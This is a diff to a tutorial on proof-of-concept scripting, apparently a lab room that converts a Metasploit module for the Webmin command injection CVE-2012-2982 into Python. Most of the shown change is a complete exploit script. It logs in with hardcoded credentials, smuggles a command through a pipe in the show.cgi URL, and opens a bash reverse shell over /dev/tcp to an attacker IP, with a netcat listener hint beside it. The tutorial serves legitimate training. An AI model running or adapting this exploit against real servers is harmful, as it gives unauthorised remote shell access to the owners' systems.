@@ -1,5 +1,24 @@
 # Introduction to Proof of Concept Scripting
 
+- [What are PoC Scripts](#what-are-poc-scripts)
+  - [Why learn to write PoC scripts and exploit development?](#why-learn-to-write-poc-scripts-and-exploit-development)
+  - [Methodologies](#methodologies)
+- [The Starting Point](#the-starting-point)
+  - [CVE-2012-2012-2982 Description](#cve-2012-2012-2982-description)
+  - [Understanding the Vulnerability](#understanding-the-vulnerability)
+- [Translating Metasploit Module Code](#translating-metasploit-module-code)
+  - [Initialize Function](#initialize-function)
+  - [Check Function](#check-function)
+  - [Exploit Function](#exploit-function)
+  - [Module Code](#module-code)
+  - [All information Needing Converted to python](#all-information-needing-converted-to-python)
+- [Converting Ruby to Python](#converting-ruby-to-python)
+  - [Initialize Payload](#initialize-payload)
+  - [Login](#login)
+  - [Exploit](#exploit)
+- [Final Exploit and Test](#final-exploit-and-test)
+- [Addiitonal Resourcese](#addiitonal-resourcese)
+
 ## What are PoC Scripts
 
 This room is an introduction to a fundamental skill of most cybersecurity domains; exploit development by crafting exploit scripts from proof of concept code.  
@@ -497,7 +516,45 @@ Conversion Requirements Met:
 
 ## Final Exploit and Test
 
-## Common Mistakes
+```python
+#!/usr/bin/env python
+
+#usage: python3 web.py <targetIP>
+import sys, requests, string, secrets
+
+targetIP = sys.argv[1]
+lhost = "10.10.10.10" #attacker IP, Change this 
+lport = "53" #listening port, "nc -nlvp 53"
+
+data = {'page' : "%2F", 'user' : "user1", 'pass' : "1user"}
+url = f"http://{targetIP}/session_login.cgi"
+
+r = requests.post(url, data=data, cookies={"testing":"1"}, verify=False, allow_redirects=False)
+
+if r.status_code == 302 and r.cookies["sid"] != None:
+	print("[+] Login successful, executing payload")
+else:
+	print("[-] Failed to login")
+
+sid = r.cookies["sid"]
+
+def rand():
+	alphaNum = string.ascii_letters + string.digits
+	randChar = ''.join(secrets.choice(alphaNum) for i in range(5))
+	return randChar
+
+def payload():
+	payload = f"bash -c 'exec bash -i &>/dev/tcp/{lhost}/{lport}<&1'"
+	return payload
+
+exp = f"http://{targetIP}/file/show.cgi/bin/{rand()}|{payload()}|"
+
+req = requests.post(exp, cookies={"sid":sid}, verify=False, allow_redirects=False)
+```
+
+`:> python3 web.py <Target IP>`  
+
+![Success](assets/proof-104.png)  
 
 ## Addiitonal Resourcese
 
